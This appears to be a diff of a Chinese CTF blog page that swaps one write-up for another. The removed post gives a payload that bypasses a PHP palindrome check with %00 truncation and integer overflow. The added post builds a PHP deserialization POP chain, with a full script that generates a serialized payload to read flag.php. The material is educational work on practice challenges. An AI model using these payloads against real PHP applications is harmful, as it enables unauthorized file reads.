@@ -6,25 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>你真的会PHP吗？(实验吧) | GAP&#39;s blog</title>
+  <title>babyGo(安恒2019.1 pop链的构造) | GAP&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="根据题目感觉应该是一道php代码审计的题目，进入题目后f12在响应头中得到hint。访问地址得到我们可以知道需要以post方式传入变量number，foreach当中会对会对vlaue进行trim()和addslashes()，trim()函数会移除换行和空格符。addslashes()函数会将语句当中的 ‘ 换成 /’ 可以防止sql注入，但我们可以用宽字节注入的方式进行绕过。is_palind">
+  <meta name="description" content="周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。再看一看这道题目的baby类也就是说这道题目中的类baby调用了sec类的read()方法。但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。这个时候就要利用最开始提到的pop链来调用co">
 <meta name="keywords" content="php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="你真的会PHP吗？(实验吧)">
-<meta property="og:url" content="http://yoursite.com/2019/03/29/你真的会PHP吗？(实验吧)/index.html">
+<meta property="og:title" content="babyGo(安恒2019.1 pop链的构造)">
+<meta property="og:url" content="http://yoursite.com/2019/03/29/babyGo/index.html">
 <meta property="og:site_name" content="GAP&#39;s blog">
-<meta property="og:description" content="根据题目感觉应该是一道php代码审计的题目，进入题目后f12在响应头中得到hint。访问地址得到我们可以知道需要以post方式传入变量number，foreach当中会对会对vlaue进行trim()和addslashes()，trim()函数会移除换行和空格符。addslashes()函数会将语句当中的 ‘ 换成 /’ 可以防止sql注入，但我们可以用宽字节注入的方式进行绕过。is_palind">
+<meta property="og:description" content="周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。再看一看这道题目的baby类也就是说这道题目中的类baby调用了sec类的read()方法。但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。这个时候就要利用最开始提到的pop链来调用co">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190131204023658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190131204116358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019013121361039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190131214038927.png">
-<meta property="og:updated_time" content="2019-03-29T14:34:16.787Z">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/babyGo/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/babyGo/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/babyGo/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/babyGo/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/29/babyGo/5.png">
+<meta property="og:updated_time" content="2019-03-29T17:00:25.440Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="你真的会PHP吗？(实验吧)">
-<meta name="twitter:description" content="根据题目感觉应该是一道php代码审计的题目，进入题目后f12在响应头中得到hint。访问地址得到我们可以知道需要以post方式传入变量number，foreach当中会对会对vlaue进行trim()和addslashes()，trim()函数会移除换行和空格符。addslashes()函数会将语句当中的 ‘ 换成 /’ 可以防止sql注入，但我们可以用宽字节注入的方式进行绕过。is_palind">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190131204023658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
+<meta name="twitter:title" content="babyGo(安恒2019.1 pop链的构造)">
+<meta name="twitter:description" content="周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。再看一看这道题目的baby类也就是说这道题目中的类baby调用了sec类的read()方法。但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。这个时候就要利用最开始提到的pop链来调用co">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/29/babyGo/1.png">
   
     <link rel="alternative" href="/atom.xml" title="GAP&#39;s blog" type="application/atom+xml">
   
@@ -146,19 +147,19 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-你真的会PHP吗？(实验吧)" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-babyGo" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      你真的会PHP吗？(实验吧)
+      babyGo(安恒2019.1 pop链的构造)
     </h1>
   
 
         
-        <a href="/2019/03/29/你真的会PHP吗？(实验吧)/" class="archive-article-date">
+        <a href="/2019/03/29/babyGo/" class="archive-article-date">
   	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
 </a>
         
@@ -166,7 +167,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>根据题目感觉应该是一道php代码审计的题目，进入题目后f12在响应头中得到hint。<br><img src="https://img-blog.csdnimg.cn/20190131204023658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问地址得到<br><img src="https://img-blog.csdnimg.cn/20190131204116358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以知道需要以post方式传入变量number，foreach当中会对会对vlaue进行trim()和addslashes()，trim()函数会移除换行和空格符。addslashes()函数会将语句当中的 ‘ 换成 /’ 可以防止sql注入，但我们可以用宽字节注入的方式进行绕过。<br>is_palindrome_number函数，判断number是否为一个回文数，即一个数正序和倒序一样的数字。<br><img src="https://img-blog.csdnimg.cn/2019013121361039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>is_numeric()函数判断是否为一个数字，可以用%00截断进行绕过。<br>题目要求number不能是一个数字，但需要是不一个“回文数”可strrev()函数的要求需要其正序和倒序的值相同，便出现了可矛盾的地方。题目的漏洞存在于处理strrev()函数的语句当中<img src="https://img-blog.csdnimg.cn/20190131214038927.png" alt="在这里插入图片描述"><br>intval函数获取变量的整数值，但intval最大的取值取决于操作系统，32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。（可以满足倒序后不是回文数但值相等的条件）。<br>payload:number=2147483647%00</p>
+        <p>周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。<br><img src="/2019/03/29/babyGo/1.png" alt="在这里插入图片描述"><br>再看一看这道题目的baby类<br><img src="/2019/03/29/babyGo/2.png" alt="在这里插入图片描述"><br>也就是说这道题目中的类baby调用了sec类的read()方法。<br><img src="/2019/03/29/babyGo/3.png" alt="在这里插入图片描述"><br>但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。<br><img src="/2019/03/29/babyGo/4.png" alt="在这里插入图片描述"><br>这个时候就要利用最开始提到的pop链来调用cool类的read方法。构造的方法如下(将构造函数中的sec改为cool即可)<br><img src="/2019/03/29/babyGo/5.png" alt="在这里插入图片描述"></p>
+<p>注意到cool类中read方法的判断语句<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>，而且<code>$this-&gt;nice-&gt;aaa = $sth;</code>变量aaa被一个未知量<code>$sth</code>赋值了。这个时候我们利用指针<code>$a-&gt;bbb =&amp;$a-&gt;aaa;</code>这样bbb的值就能随着aaa的变化而变化，在线编译一下(其中amazing是一个序列化的空的baby类的对象)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;skyobj = new cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&apos;flag.php&apos;;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing=&apos;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D&apos;; </span><br><span class="line">    function read()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;nice = unserialize($this-&gt;amzing);</span><br><span class="line">        $this-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;you must be joking!&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class sec </span><br><span class="line">&#123;  </span><br><span class="line">    function read()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;it&apos;s so sec~~&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa; </span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>get方式传入结果，得到flag</p>
 
       
 
@@ -236,7 +240,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/29/你真的会PHP吗？(实验吧)/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/29/babyGo/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -250,17 +254,17 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/29/babyGo(安恒2019.1 pop链的构造)/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/03/29/你真的会PHP吗/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          babyGo(安恒2019.1 pop链的构造)
+          你真的会PHP吗？(实验吧)
         
       </div>
     </a>
   
   
-    <a href="/2019/03/29/加了料的报错注入(实验吧)/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2019/03/29/加了料的报错注入/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">加了料的报错注入(实验吧)</div>
       <i class="icon-circle-right"></i>
     </a>
